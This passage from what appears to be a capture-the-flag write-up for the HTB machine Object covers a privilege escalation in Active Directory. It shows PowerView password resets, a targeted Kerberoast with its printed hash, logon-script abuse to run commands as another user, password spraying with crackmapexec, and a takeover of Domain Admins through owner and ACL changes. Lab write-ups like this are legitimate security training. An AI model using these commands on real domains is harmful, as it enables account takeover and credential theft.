+d-----        4/10/2020  10:49 AM                USOShared
+d-----        8/25/2021   2:57 AM                VMware
+-a----        2/27/2022  11:17 AM           8980 20220227111707_BloodHound.zip
+-a----        2/27/2022  11:17 AM          10043 MWU2MmE0MDctMjBkZi00N2VjLTliOTMtYThjYTY4MjdhZDA2.bin
+-a----        2/27/2022  11:04 AM         883200 SharpHound.exe
+-a----        2/27/2022  11:15 AM         974139 SharpHound.ps1
+</span></code></pre></div></div>
+<p>The Zip archive is the results, which I’ll download to my VM:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">download</span><span class="w"> </span><span class="nx">C:\programdata\20220227174044_BloodHound.zip</span><span class="w"> </span><span class="nx">20220227174044_BloodHound.zip</span><span class="w">
+</span><span class="go">Info: Downloading C:\programdata\20220227174044_BloodHound.zip to 20220227174044_BloodHound.zip
+
+                                                             
+Info: Download successful!
+</span></code></pre></div></div>
+<h4 id="analysis">Analysis</h4>
+<p>I’ll load that data into BloodHound and take a look. It important to not use the newest version of BloodHound (4.1+), as the data from this older PS1 file won’t load. So I found the release before they removed the PowerShell collector and used that, <a href="https://github.com/BloodHoundAD/BloodHound/releases/tag/4.0.3">4.0.3</a>.</p>
+<p>First I’ll find oliver and mark that user as owned. The first place to look is the “Outbound Control Rights”, which shows oliver has <code class="language-plaintext highlighter-rouge">ForceChangePassword</code> over smith.</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220227210442678.webp" type="image/webp"/>
+<img alt="image-20220227210442678" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220227210442678.png"/>
+</picture>
+<p>Doing the same for smith, shows that user has <code class="language-plaintext highlighter-rouge">GenericWrite</code> over maria, and maria has <code class="language-plaintext highlighter-rouge">WriteOwner</code> over Domain Admins.</p>
+<p>One of the pre-canned queries under “Analysis”, “Find Shortest Paths to Domain Admins”, actually shows the full path:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220227210342139.png"><img alt="image-20220227210342139" src="https://0xdfimages.gitlab.io/img/image-20220227210342139.png"/><em>Click for full size image</em></a></p>
+<h3 id="change-smiths-password">Change smith’s Password</h3>
+<p>BloodHound’s help on <code class="language-plaintext highlighter-rouge">ForceChangePassword</code> can be loaded by right clicking on the label:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220228054231102.webp" type="image/webp"/>
+<img alt="image-20220228054231102" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220228054231102.png"/>
+</picture>
+<p>It shows just how to do it using <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a> on the “Abuse Info” tab:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220228054402736.webp" type="image/webp"/>
+<img alt="image-20220228054402736" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220228054402736.png"/>
+</picture>
+<p>I’ll download PowerView, upload it to Object, and import it into this session:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">upload</span><span class="w"> </span><span class="nx">PowerView.ps1</span><span class="w">
+</span><span class="go">Info: Uploading PowerView.ps1 to C:\programdata\PowerView.ps1
+
+                                                             
+Data: 1027036 bytes of 1027036 bytes copied
+
+Info: Upload successful!
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\PowerView.ps1</span><span class="w">
+</span></code></pre></div></div>
+<p>As I already have a shell as oliver, I don’t need to pass that credential. I’ll just create a password and change it:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="nv">$newpass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'0xdf0xdf!'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">smith</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="nv">$newpass</span><span class="w">
+</span></code></pre></div></div>
+<h3 id="evil-winrm">Evil-WinRM</h3>
+<p>smith is a member of Remote Management Users:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220228054030528.webp" type="image/webp"/>
+<img alt="image-20220228054030528" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220228054030528.png"/>
+</picture>
+<p>This means the account can connect over WinRM. With the new password, I’ll use <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a> again:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> 10.10.11.132 <span class="nt">-u</span> smith <span class="nt">-p</span> <span class="s1">'0xdf0xdf!'</span>
+<span class="go">
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+</span><span class="gp">*Evil-WinRM* PS C:\Users\smith\Documents&gt;</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="shell-as-maria">Shell as Maria</h2>
+<h3 id="kerberoast">Kerberoast</h3>
+<p>The help in BloodHound for <code class="language-plaintext highlighter-rouge">GenericWrite</code> says:</p>
+<blockquote>
+<p>A targeted kerberoast attack can be performed using PowerView’s Set-DomainObject along with Get-DomainSPNTicket.</p>
+</blockquote>
+<p>I’ll add an SPN to maria’s account:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Set-DomainObject</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">maria</span><span class="w"> </span><span class="nt">-SET</span><span class="w"> </span><span class="p">@{</span><span class="nx">serviceprincipalname</span><span class="o">=</span><span class="s1">'nonexistent/0XDF'</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>For some reason, this doesn’t take:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nx">maria</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">serviceprinciplename</span><span class="w">
+</span><span class="go">
+serviceprinciplename
+--------------------
+
+</span></code></pre></div></div>
+<p><del>It’s not clear to my why I can’t write this SPN, but it seems like a dead end.</del></p>
+<p><em>Update</em>: After publishing this bit, I got this reply on Twitter:</p>
+<blockquote class="twitter-tweet"><p dir="ltr" lang="en">Cool writeup ! <br/>You could actually set an SPN for Maria and kerberoast it. You had to provide Smith's credential object but the hash was not crackable anyways :( . You can find how I did it here <a href="https://t.co/TkuUqrmL2o">https://t.co/TkuUqrmL2o</a></p>— morph3 (@melihkaanyldz) <a href="https://twitter.com/melihkaanyldz/status/1498635702300549123?ref_src=twsrc%5Etfw">March 1, 2022</a></blockquote>
+<script async="" charset="utf-8" src="https://platform.twitter.com/widgets.js"></script>
+<p>This wasn’t quite right, as because the shell is already running as smith, the cred isn’t necessary. It seems that my instance of Object was just in a bad state. On a reset:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Set-DomainObject</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">maria</span><span class="w"> </span><span class="nt">-SET</span><span class="w"> </span><span class="p">@{</span><span class="nx">serviceprincipalname</span><span class="o">=</span><span class="s1">'nonexistent/0XDF'</span><span class="p">}</span><span class="w">
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nx">maria</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">serviceprincipalname</span><span class="w">
+</span><span class="go">
+serviceprincipalname
+--------------------
+nonexistent/0XDF
+</span></code></pre></div></div>
+<p>But in subsequent replies on Twitter, morph3 did show how to do it using <code class="language-plaintext highlighter-rouge">setspn</code> (a <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)">binary</a> that should be on DC). That works as well, as now both SPNs are there:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">setspn</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nx">MSSQLSvc/object.local:1433</span><span class="w"> </span><span class="nx">object.local\maria</span><span class="w">
+</span><span class="go">Checking domain DC=object,DC=local
+CN=maria garcia,CN=Users,DC=object,DC=local
+        MSSQLSvc/object.local:1433
+
+Updated object
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nx">maria</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">serviceprincipalname</span><span class="w">
+</span><span class="go">
+serviceprincipalname
+--------------------
+{object.local/maria.object.local:1337, nonexistent/0XDF}
+</span></code></pre></div></div>
+<p>To actually Kerberoast, I’ll need to use an SPN with a <a href="https://docs.microsoft.com/en-us/windows/win32/ad/name-formats-for-unique-spns">valid format</a> (unlike <code class="language-plaintext highlighter-rouge">nonexistent/0xDF</code>), so I’ll use that one going forward.</p>
+<p><code class="language-plaintext highlighter-rouge">PowerView</code> has <code class="language-plaintext highlighter-rouge">Get-DomainSPNTicket</code> to Kerberoast, but it actually requires a credential object (even though I am logged in as smith):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Get-DomainSPNTicket</span><span class="w"> </span><span class="nt">-SPN</span><span class="w"> </span><span class="s2">"MSSQLSvc/object.local:1433"</span><span class="w">
+</span><span class="go">Warning: [Get-DomainSPNTicket] Error requesting ticket for SPN 'MSSQLSvc/object.local:1433' from user 'UNKNOWN' : Exception calling ".ctor" with "1" argument(s): "The NetworkCredentials provided were unable to c
+reate a Kerberos credential, see inner exception for details."
+</span></code></pre></div></div>
+<p>The error message is about the credentials being invalid. I’ll create a credential object:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="nv">$pass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'0xdf0xdf!'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> 
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="nv">$cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s1">'object.local\smith'</span><span class="p">,</span><span class="w"> </span><span class="nv">$pass</span><span class="p">)</span><span class="w">
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Get-DomainSPNTicket</span><span class="w"> </span><span class="nt">-SPN</span><span class="w"> </span><span class="s2">"MSSQLSvc/object.local:1433"</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w">
+</span><span class="go">Warning: [Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work.
+Warning: [Invoke-UserImpersonation] Executing LogonUser() with user: object.local\smith
+
+SamAccountName       : UNKNOWN
+DistinguishedName    : UNKNOWN
+ServicePrincipalName : MSSQLSvc/object.local:1433
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN$MSSQLSvc/object.local:1433*$DAECA7C0ACC55F14934E5E8A382F7AD6$FB41B91C34D8B1139FD30A93B7C0534D7767606C940A162D6A08BD7A84C604FC6757E2EFB5CCEAC9B6B87052440E82F0A111663EE2E9153746E5C13296E39D2788BE41F4
+81F2F2594F3D90011C2BDEFFC704613ACA9B3684A9F96B352E6DD0B0B0009C294DA4E8203AA43C0221F3263115899E7B77989CEF394E9402AA96BF768D515210FCEA3D4FFA7134D8F3B2D0C867C2C63B20164C01D78A607B5249A79CAAA334AF80BD5B0D21DA948440BF0E0BB68E4AE791
+8DDAF8C860AC86EA7C21E95F29ACB53397C9F5F24A223ACEE9DCE22E255CEF0D7CB67E0F421A50D1F204ACC038D85D15716B33F0EB2B23E7A039ECAA67F4EA9327860970AD417406941EB771DB2B564096336524650D6C0D6EB1CA6BF108C339DDB9FA38DB0587F7EFBAEE98A3FE3449DB
+4DA81E59224EA0467B4DC2F2576846DDEF787E3D7BA1C213D3248B7D5D5227E00E8CA6B480227CD69DDFD7ACC05FD2F907DA6B5BABF60D630BA12679323E02E541FF81B2522A8536BE1F534640AF12C1EADE7026859C82366915C64D45BB855432BD7E72EC1AA53B91D7A6D24E609694C2
+5EA1D37AA66E5E92BE8BF9F6D1DC5E728E70F2295CDBBB2AA7651F2C2615D0ED861D8763F86F9FD5A5F5FB814F0914BC5A2185FD42A753905E28ABDA1DBD891F006C4217D412C1ACBF524B752D395C2055B6814526DF022A600A949779A98D61F80B774425F5D3D28D07F00863D71E5495
+6F68353AA2102681E6931AF8CC09F18E20F3DEBABEE639F578850D0B6D9BD4FCE3CD0DA084AAA4A1805C0E4F012FEB64BB5AB86C748FAD3DDB2ED466C4FCB075C24C2C0B56A728BB65ADBE0F2013B45C79D9C515E3F418B7B7DBCE8B34AF370427670AB12EF1A6B67CFF93B07FD21B9A61
+3D0BA3E034ACA27D2AB139F648A8AA1DAA3F3FD66EA26021855B55ADB32273B3C7D241BAFBE4E12A5F30AF5AB2EF8C4A141A41D27D567C9AFE0A1D2DB17E0BA357E13064D94E077F849D6E66ADD66F4015BE57C9FBF99E79C68ED18DC1F5916044F7ECF984F8397CF65C69776D8E432F4F
+498B323AF1963081EE28C561BBF305D6FA9593813D3A9EFC24671C9540DE1CB7006FBB36847A987EFBDD754517BEE81D8322DC5F2C529C610591D1DE053D72F79A29506725C90C9369FB285A8C2D30090A403C6906FE0C61F3E31C397A3B03768B1061C3B7E69CFDA329F4CB3EA8286A66
+1EC9CFF04C29F9BBC311AC53776C265C9DFEEDB85C4ECD5DC0DDEE64C87E9045A7632A792861B687F6358E138D11676BBFD2783D644B24837659B6F96F93AF529AFC43C32943583E4593B9BEA76B6778134C55B1EB3101CE390F3E9A494BDC927BA5FF2EF20720012FCF4270A8B1BFFA2A
+1012D7C4CACB77AE9B8DE19C8671CB09DB0F15FA008658D9669553F3C5AB3C303694D23A0F409F72DF95336F9ED8898A66289FC15AAF0B9DF0432D69FAA156BF54BBEF237DFCF0139850C5C8896C65A6DA6A4A9712A6D21F2A883EF6F25D460E
+Warning: [Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle
+</span></code></pre></div></div>
+<p>I can try to crack that with <code class="language-plaintext highlighter-rouge">hashcat</code>, but as the password is not in a standard wordlist like <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, it won’t crack without some extra effort beyond what is needed for HTB machines.</p>
+<h3 id="password-change-fail">Password Change Fail</h3>
+<p>Some <a href="https://burmat.gitbook.io/security/hacking/domain-exploitation#reset-domain-user-password">references</a> I found suggested that <code class="language-plaintext highlighter-rouge">GenericWrite</code> could work to change the user’s password, but this didn’t work here:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="nv">$newpass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'0xdf0xdf!'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">maria</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="nv">$newpass</span><span class="w">
+</span><span class="go">Warning: [Set-DomainUserPassword] Error setting password for user 'maria' : Exception calling "SetPassword" with "1" argument(s): "Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))"
+</span></code></pre></div></div>
+<h3 id="logon-script">Logon Script</h3>
+<p><a href="https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user">HackTricks</a> suggests I can use <code class="language-plaintext highlighter-rouge">GenericWrite</code> on a user to update their logon scripts. This script would run the next time the user logs in. That’s not typical on HTB/CTF machines, but it’s possibly something automated in the background.</p>
+<p>I’ll write a script that will ping my host, remembering from the firewall enumeration earlier that ICMP is one of the few things allowed outbound, and set the script:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">"ping 10.10.14.6"</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ping.ps1</span><span class="w">
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Set-DomainObject</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">maria</span><span class="w"> </span><span class="nt">-SET</span><span class="w"> </span><span class="p">@{</span><span class="nx">scriptpath</span><span class="o">=</span><span class="s2">"C:\\programdata\\ping.ps1"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>Instantly there are packets at <code class="language-plaintext highlighter-rouge">tcpdump</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-ni</span> tun0 icmp                   
+<span class="go">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode                 
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes                       
+ec11:20:01.252961 IP 10.10.11.132 &gt; 10.10.14.6: ICMP echo request, id 2, seq 11053, length 40
+11:20:01.253007 IP 10.10.14.6 &gt; 10.10.11.132: ICMP echo reply, id 2, seq 11053, length 40  
+11:20:02.260576 IP 10.10.11.132 &gt; 10.10.14.6: ICMP echo request, id 2, seq 11056, length 40
+11:20:02.260615 IP 10.10.14.6 &gt; 10.10.11.132: ICMP echo reply, id 2, seq 11056, length 40  
+11:20:03.276421 IP 10.10.11.132 &gt; 10.10.14.6: ICMP echo request, id 2, seq 11059, length 40
+11:20:03.276457 IP 10.10.14.6 &gt; 10.10.11.132: ICMP echo reply, id 2, seq 11059, length 40  
+11:20:04.279746 IP 10.10.11.132 &gt; 10.10.14.6: ICMP echo request, id 2, seq 11062, length 40
+11:20:04.279779 IP 10.10.14.6 &gt; 10.10.11.132: ICMP echo reply, id 2, seq 11062, length 40  
+11:20:05.592129 IP 10.10.11.132 &gt; 10.10.14.6: ICMP echo request, id 2, seq 11067, length 40
+11:20:05.592188 IP 10.10.14.6 &gt; 10.10.11.132: ICMP echo reply, id 2, seq 11067, length 40  
+11:20:06.604067 IP 10.10.11.132 &gt; 10.10.14.6: ICMP echo request, id 2, seq 11070, length 40
+11:20:06.604103 IP 10.10.14.6 &gt; 10.10.11.132: ICMP echo reply, id 2, seq 11070, length 40  
+11:20:07.620145 IP 10.10.11.132 &gt; 10.10.14.6: ICMP echo request, id 2, seq 11073, length 40
+...[snip]..
+</span></code></pre></div></div>
+<p>I would have expected only five pings, but it goes on indefinitely until I change the script. It seems this logon script is being run repeatedly.</p>
+<h3 id="home-dir-enum">Home Dir Enum</h3>
+<p>Because I know I can’t connect back because of the firewall, I’ll drop scripts into the logon that write results where I can read them. For example:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">"ls \users\maria\ &gt; \programdata\out"</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cmd.ps1</span><span class="w">
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Set-DomainObject</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">maria</span><span class="w"> </span><span class="nt">-SET</span><span class="w"> </span><span class="p">@{</span><span class="nx">scriptpath</span><span class="o">=</span><span class="s2">"C:\\programdata\\cmd.ps1"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>About a second or so later there’s an <code class="language-plaintext highlighter-rouge">out</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">out</span><span class="w">
+</span><span class="go">
+    Directory: C:\users\maria
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---       10/22/2021   3:54 AM                3D Objects
+d-r---       10/22/2021   3:54 AM                Contacts
+d-r---       10/25/2021   3:47 AM                Desktop
+d-r---       10/25/2021  10:07 PM                Documents
+d-r---       10/22/2021   3:54 AM                Downloads
+d-r---       10/22/2021   3:54 AM                Favorites
+d-r---       10/22/2021   3:54 AM                Links
+d-r---       10/22/2021   3:54 AM                Music
+d-r---       10/22/2021   3:54 AM                Pictures
+d-r---       10/22/2021   3:54 AM                Saved Games
+d-r---       10/22/2021   3:54 AM                Searches
+d-r---       10/22/2021   3:54 AM                Videos
+</span></code></pre></div></div>
+<p>It’s interesting that the <code class="language-plaintext highlighter-rouge">Documents</code> and <code class="language-plaintext highlighter-rouge">Desktop</code> folders have different timestamp than the rest. I’ll list those directories:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">"ls \users\maria\documents &gt; \programdata\out; ls \users\maria\desktop\ &gt; \programdata\out2"</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cmd.ps1</span><span class="w">
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="nx">out</span><span class="o">*</span><span class="w">
+</span><span class="go">
+    Directory: C:\programdata
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        2/28/2022   3:42 AM              0 out
+-a----        2/28/2022   3:42 AM            830 out2
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">out2</span><span class="w">
+</span><span class="go">
+    Directory: C:\users\maria\desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/26/2021   8:13 AM           6144 Engines.xls
+</span></code></pre></div></div>
+<p>There’s a single file on the desktop. I’ll copy it to <code class="language-plaintext highlighter-rouge">programdata</code> and download it:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">"copy \users\maria\desktop\Engines.xls \programdata\"</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cmd.ps1</span><span class="w">  
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="nx">Engines.xls</span><span class="w">
+</span><span class="go">
+    Directory: C:\programdata
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/26/2021   8:13 AM           6144 Engines.xls
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">download</span><span class="w"> </span><span class="nx">C:\programdata\Engines.xls</span><span class="w"> </span><span class="nx">Engines.xls</span><span class="w">
+</span><span class="go">Info: Downloading C:\programdata\Engines.xls to Engines.xls
+
+                                                             
+Info: Download successful!
+</span></code></pre></div></div>
+<h3 id="enginesxls">Engines.xls</h3>
+<p>The Excel file opens in LibreOffice <code class="language-plaintext highlighter-rouge">Calc</code> in my Linux VM, and it includes a list of machines and passwords for maria:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220228064648956.webp" type="image/webp"/>
+<img alt="image-20220228064648956" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220228064648956.png"/>
+</picture>
+<h3 id="winrm-1">WinRM</h3>
+<p><a href="https://github.com/byt3bl33d3r/CrackMapExec">crackmapexec</a> can quickly test each password for maria. I’ll save them into a text time, and run it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>crackmapexec winrm 10.10.11.132 <span class="nt">-u</span> maria <span class="nt">-p</span> maria-pass 
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.132    5985   NONE             </span><span class="netexec-logmessage">[*]</span><span class="go"> None (name:10.10.11.132) (domain:None)
+</span><span class="netexec-protocol">HTTP </span><span class="go">       10.10.11.132    5985   NONE             </span><span class="netexec-logmessage">[*]</span><span class="go"> http://10.10.11.132:5985/wsman
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.132    5985   NONE             </span><span class="netexec-logfail">[-]</span><span class="go"> None\maria:d34gb8@
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.132    5985   NONE             </span><span class="netexec-logfail">[-]</span><span class="go"> None\maria:0de_434_d545
+</span><span class="netexec-protocol">WINRM </span><span class="go">      10.10.11.132    5985   NONE             </span><span class="netexec-logsuccess">[+]</span><span class="go"> None\maria:W3llcr4ft3d_4cls </span><span class="netexec-pwned">(Pwn3d!)</span><span class="go">
+</span></code></pre></div></div>
+<p>The last one works over WinRM for maria:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> 10.10.11.132 <span class="nt">-u</span> maria <span class="nt">-p</span> <span class="s1">'W3llcr4ft3d_4cls'</span>
+<span class="go">
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+</span><span class="gp">*Evil-WinRM* PS C:\Users\maria\Documents&gt;</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="shell-with-domain-admins">Shell with Domain Admins</h2>
+<h3 id="takeover-domain-admins-group">Takeover Domain Admins Group</h3>
+<p>maria has <code class="language-plaintext highlighter-rouge">WriteOwner</code> on the Domain Admins group. From the help in BloodHound, this means maria can change the owner of the group.</p>
+<p>I’ll import <code class="language-plaintext highlighter-rouge">PowerView.ps</code> and then assign maria as the owner of the group:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Set-DomainObjectOwner</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Domain Admins'</span><span class="w"> </span><span class="nt">-OwnerIdentity</span><span class="w"> </span><span class="s1">'maria'</span><span class="w">
+</span></code></pre></div></div>
+<p>I think there are some weird timing issues that can come up running this command that causes the command to fail (likely some cleanup cron setting the permissions back). Waiting a minute and running again worked.</p>
+<p>As owner, maria can give maria full rights over the group:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="s2">"Domain Admins"</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">maria</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">All</span><span class="w">
+</span></code></pre></div></div>
+<p>Now maria can add themself to the group:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">Add-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Domain Admins'</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="s1">'maria'</span><span class="w">
+</span></code></pre></div></div>
+<p>It worked:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">maria</span><span class="w">
+</span><span class="go">User name                    maria
+Full Name                    maria garcia
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/21/2021 8:16:32 PM
+Password expires             Never
+Password changeable          10/22/2021 8:16:32 PM
